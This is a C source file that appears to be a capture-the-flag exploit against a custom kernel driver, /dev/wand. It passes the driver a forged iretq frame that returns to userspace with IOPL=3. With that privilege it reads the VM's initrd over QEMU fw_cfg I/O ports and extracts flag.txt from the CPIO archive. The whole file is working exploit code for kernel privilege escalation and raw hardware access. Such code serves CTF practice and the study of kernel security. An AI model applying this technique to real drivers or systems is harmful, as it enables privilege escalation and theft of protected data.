#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define WAND_MAGIC 'a'

struct iret_frame {
	uint64_t rip;
	uint64_t cs;
	uint64_t rflags;
	uint64_t rsp;
	uint64_t ss;
};

#define WAND_CAST _IOW(WAND_MAGIC, 0, struct iret_frame)

#define RFLAGS_IOPL3  0x3202UL   /* IF=1 | IOPL=3 | reserved-1 */
#define USER_CS       0x33UL
#define USER_SS       0x2bUL

#define FW_CFG_SEL          0x510
#define FW_CFG_DATA         0x511
#define FW_CFG_INITRD_SIZE  0x000b
#define FW_CFG_INITRD_DATA  0x0012

static inline void outw_p(uint16_t val, uint16_t port)
{
	asm volatile("outw %w0, %w1" :: "a"(val), "Nd"(port));
}
static inline uint8_t inb_p(uint16_t port)
{
	uint8_t v;
	asm volatile("inb %w1, %b0" : "=a"(v) : "Nd"(port));
	return v;
}
static uint32_t fw_cfg_read_u32(uint16_t sel)
{
	uint32_t v = 0;
	outw_p(sel, FW_CFG_SEL);
	for (int i = 0; i < 4; i++)
		((uint8_t *)&v)[i] = inb_p(FW_CFG_DATA);
	return v;
}
static void fw_cfg_read_bytes(uint16_t sel, uint8_t *buf, uint32_t len)
{
	outw_p(sel, FW_CFG_SEL);
	for (uint32_t i = 0; i < len; i++)
		buf[i] = inb_p(FW_CFG_DATA);
}

#define CPIO_MAGIC "070701"
#define CPIO_HDR   110

static uint32_t hex8(const uint8_t *p)
{
	char tmp[9]; memcpy(tmp, p, 8); tmp[8] = '\0';
	return (uint32_t)strtoul(tmp, NULL, 16);
}
static uint32_t align4(uint32_t v) { return (v + 3u) & ~3u; }

static void cpio_find_flag(uint8_t *buf, uint32_t sz)
{
	uint8_t *p = buf, *end = buf + sz;
	while (p + CPIO_HDR <= end) {
		if (memcmp(p, CPIO_MAGIC, 6) != 0) {
			fprintf(stderr, "[-] bad CPIO magic\n"); return;
		}
		uint32_t fsz = hex8(p + 54);
		uint32_t nsz = hex8(p + 94);
		char    *nm  = (char *)(p + CPIO_HDR);
		if (nsz > 0 && !strcmp(nm, "TRAILER!!!")) break;
		if (nsz > 0 && !strcmp(nm, "flag.txt")) {
			uint32_t doff = align4(CPIO_HDR + nsz);
			printf("[+] FLAG: %.*s\n", (int)fsz, (char *)(p + doff));
			return;
		}
		uint32_t doff = align4(CPIO_HDR + nsz);
		p += align4(doff + fsz);
	}
	fprintf(stderr, "[-] flag.txt not found\n");
}

#define USER_STACK_SZ (32 * 4096)
static uint8_t _user_stack[USER_STACK_SZ] __attribute__((aligned(4096)));

__attribute__((noinline, used))
static void win_fn(void)
{
	puts("[+] back in userspace with IOPL=3!");

	uint32_t isz = fw_cfg_read_u32(FW_CFG_INITRD_SIZE);
	printf("[*] initrd size = %u bytes\n", isz);

	uint8_t *initrd = malloc(isz);
	if (!initrd) { perror("malloc"); exit(1); }

	fw_cfg_read_bytes(FW_CFG_INITRD_DATA, initrd, isz);
	puts("[*] initrd fetched, parsing CPIO...");
	cpio_find_flag(initrd, isz);
	free(initrd);
	exit(0);
}

int main(void)
{
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	int fd = open("/dev/wand", O_RDWR);
	if (fd < 0) { perror("open /dev/wand"); return 1; }
	printf("[*] opened /dev/wand (fd=%d)\n", fd);

	/*
	 * iretq frame – the only thing we need to supply:
	 *
	 *   rip    → win_fn  (where to land)
	 *   cs     → 0x33    (64-bit user code segment)
	 *   rflags → 0x3202  (IF=1, IOPL=3 – lets us do port I/O from user)
	 *   rsp    → top of our private user stack
	 *   ss     → 0x2b    (user data segment)
	 */
	struct iret_frame fr = {
		.rip    = (uint64_t)win_fn,
		.cs     = USER_CS,
		.rflags = RFLAGS_IOPL3,
		.rsp    = (uint64_t)(_user_stack + USER_STACK_SZ),
		.ss     = USER_SS,
	};

	printf("[*] iret frame → rip=%p  cs=%#lx  rfl=%#lx  rsp=%#lx  ss=%#lx\n",
	       win_fn, fr.cs, fr.rflags, fr.rsp, fr.ss);
	puts("[*] casting spell...");

	ioctl(fd, WAND_CAST, &fr);  

	fprintf(stderr, "[-] ioctl returned – something went wrong\n");
	return 1;
}